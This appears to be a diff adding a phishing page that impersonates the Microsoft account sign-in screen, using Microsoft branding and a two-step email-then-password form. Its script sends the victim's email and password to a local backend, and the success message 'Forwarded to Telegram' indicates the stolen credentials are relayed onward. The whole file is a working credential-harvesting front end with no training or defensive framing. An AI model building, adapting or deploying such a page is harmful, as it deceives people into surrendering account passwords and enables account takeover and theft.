@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign in to your Microsoft account</title>
+   <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+  <main class="login-container">
+    <!-- Microsoft Logo Header -->
+    <div class="logo-wrapper">
+      <div class="microsoft-logo">
+        <span class="square red"></span>
+        <span class="square green"></span>
+        <span class="square blue"></span>
+        <span class="square yellow"></span>
+      </div>
+      <span class="brand-name">Microsoft</span>
+    </div>
+
+    <!-- Dynamic Title & Subtitle -->
+    <h1>Sign in</h1>
+    <p class="subtitle" id="subtitle-text">Use your Microsoft account.</p>
+
+    <!-- Error/Status Message Area -->
+    <div id="message" class="message-banner"></div>
+
+    <form onsubmit="event.preventDefault(); handleNext();">
+      
+      <!-- STEP 1: EMAIL INPUT -->
+      <div id="step-email">
+        <div class="input-container">
+          <input 
+            type="text" 
+            id="email" 
+            placeholder=" " 
+            autocomplete="off"
+          />
+          <label for="email" class="floating-label">Email or phone number</label>
+        </div>
+      </div>
+
+      <!-- STEP 2: PASSWORD INPUT (Hidden Initially) -->
+      <div id="step-password" style="display: none;">
+        <div class="input-container">
+          <input 
+            type="password" 
+            id="password" 
+            placeholder=" " 
+            autocomplete="current-password"
+          />
+          <label for="password" class="floating-label">Password</label>
+        </div>
+      </div>
+
+      <!-- Dynamic Link (Swaps between "Forgot username" and "Forgot password") -->
+      <div class="links-group">
+        <a href="#" class="link text-blue" id="left-link">Forgot your username?</a>
+      </div>
+
+      <!-- Submit Button -->
+      <button type="submit" class="btn-primary" id="btn-next">Next</button>
+    </form>
+
+    <!-- Sign Up Link -->
+    <div class="signup-text">
+      New to Microsoft? <a href="#" class="link text-blue">Create an account</a>
+    </div>
+  </main>
+
+  <!-- Footer Links -->
+  <footer class="footer">
+    <div class="footer-links">
+      <a href="#">Help and feedback</a>
+      <a href="#">Terms of use</a>
+      <a href="#">Privacy and cookies</a>
+    </div>
+    <div class="footer-note">
+      Use private browsing if this is not your device. <a href="#" class="link text-blue">Learn more</a>
+    </div>
+  </footer>
+
+  <!-- YOUR JAVASCRIPT -->
+ <script>
+    let currentStep = 1;
+    let storedEmail = "";          // ← Fixed (empty string)
+
+    async function handleNext() {
+        const messageDiv = document.getElementById("message");
+
+        if (currentStep === 1) {
+            const emailInput = document.getElementById("email").value.trim();
+
+            if (!emailInput) {
+                messageDiv.style.color = "red";
+                messageDiv.innerText = "Enter an email or phone number";
+                return;
+            }
+
+            // Save email and move to password step
+            storedEmail = emailInput;
+            messageDiv.innerText = "";
+
+            document.getElementById("step-email").style.display = "none";
+            document.getElementById("step-password").style.display = "block";
+            document.getElementById("subtitle-text").innerText = storedEmail;
+            document.getElementById("left-link").innerText = "Forgot password?";
+
+            currentStep = 2;
+
+        } else if (currentStep === 2) {
+            const passwordInput = document.getElementById("password").value;
+
+            if (!passwordInput) {
+                messageDiv.style.color = "red";
+                messageDiv.innerText = "Enter a password";
+                return;
+            }
+
+            // Send email + password to local FastAPI
+            try {
+                const response = await fetch("http://127.0.0.1:8000/api/auth", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        email: storedEmail,
+                        password: passwordInput,
+                        action: "signup"
+                    })
+                });
+
+                const data = await response.json();
+
+                if (response.ok) {
+                    messageDiv.style.color = "green";
+                    messageDiv.innerText = "Success! Forwarded to Telegram.";
+                } else {
+                    messageDiv.style.color = "red";
+                    messageDiv.innerText = data.detail || "An error occurred.";
+                }
+            } catch (error) {
+                console.error(error);
+                messageDiv.style.color = "red";
+                messageDiv.innerText = "Could not connect to backend server.";
+            }
+        }
+    }
+</script>
+
+</body>
+</html>
